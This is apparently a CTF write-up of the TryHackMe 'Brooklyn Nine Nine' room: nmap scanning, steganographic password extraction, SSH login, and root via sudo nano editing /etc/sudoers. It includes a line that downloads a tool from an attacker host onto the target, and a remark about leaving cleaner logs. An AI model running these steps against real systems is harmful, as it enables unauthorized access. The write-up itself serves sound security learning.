## TryHackMe | Brooklyn Nine Nine 🚓
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/f949f162-b92d-441d-85e4-8686a47dc47f" />

Target IP: 10.114.148.7

---

## 1. Reconnaissance using Nmap: 👁️
I used Nmap on the target machine as an initial scan and found 3 open ports using the following command:
```bash
nmap -sCV -T4 -A -O 10.114.148.7
```

>- port 21 - ftp
>- port 22 - ssh
>- port 80 - http

You can check the full result [Here](outputs/nmap_result).

---

## 2. Checking the web application: 🧲

Since I already had the terminal open I used `curl` to pull the source code of the page.

```bash
curl 10.114.148.7
```

<img width="960" height="540" alt="Screenshot 2026-09-13 175657" src="https://github.com/user-attachments/assets/752b3ace-a4a9-4cd4-97da-9d240412f051" />

I found 2 points of interest in the source code:
1. The image asset that was in the current directory.
2. At the bottom of the source code it mentioned the term `"steganography"` in a comment.

---

## 3. Steganography: 📡

* Steganography - is the practice of concealing a secret message, file, or image within another ordinary non-secret file or physical object to hide the very existence of the communication.

A quick and easy way to unveil such messages, files or images is by using the command:

```bash
stegseek {file}
```

It is simple, efficient and very beginner friendly.

I pulled the image from the web page using `wget` and used `stegseek` to extract data embedded using steganography:

<img width="941" height="132" alt="Screenshot 2026-09-13 175740" src="https://github.com/user-attachments/assets/3228c058-2d74-4207-878f-efb70a295622" />

##

After checking the output I stumbled across the password for a user named "holt".

<img width="425" height="158" alt="Screenshot 2026-09-13 175811" src="https://github.com/user-attachments/assets/abcd2fae-39e5-4aa4-b8f8-24011066f37a" />

Since there was no log-in form on the web application I figured it must be related to either the ftp or the ssh services.

I tested the ssh service first since I thought it would be easier to work with in order to get root access through ssh and I was able to access Holt's account and find in his home directory the first flag

---

## 4. Privilege Escalation: 🪜

After accessing Holt's account, I used `sudo -l` to check for his privileges and found I have access to the `nano` command with root privileges.

I thought here might be a privileged process I could leverage in order to gain access to root under a reverse shell so I used a python http server to upload the `pspy64` tool.
>- Attacker machine: python3 -m http.server 80
>- Target machine: wget http://{AttackerIP}:80/pspy64
>- Target machine: chmod +x pspy64
>- Target machine: ./pspy64

I couldn't find a process that will help me in the scenario so I moved into a different direction.

I proceeded to try to give Holt's account root privileges so I edited `/etc/sudoers` and gave Holt all the privileges possible:

<img width="395" height="71" alt="Screenshot 2026-09-13 175411" src="https://github.com/user-attachments/assets/5976558d-936a-4688-a0f3-6aeaa7e9feb4" />

I was then able to check root's home directory and retrieve the flag from there using only Holt's account.

---

## Key Takeaways: 🧠

1. It is always important to look in the source code for low-hanging fruits.
2. If there is an indication for the usage of steganography, a hacker needs to know how to check for the contents inside.
3. In a real scenario I wouldn't give Holt root privileges since it's pointing easily to source of breach. It would be better to get a shell through nano for root since it affects less the entire machine and I think may look cleaner in the logs.

---

## Disclaimer: ⚠️

This work was performed in a controlled, legal lab environment provided by TryHackMe for educational purposes only.
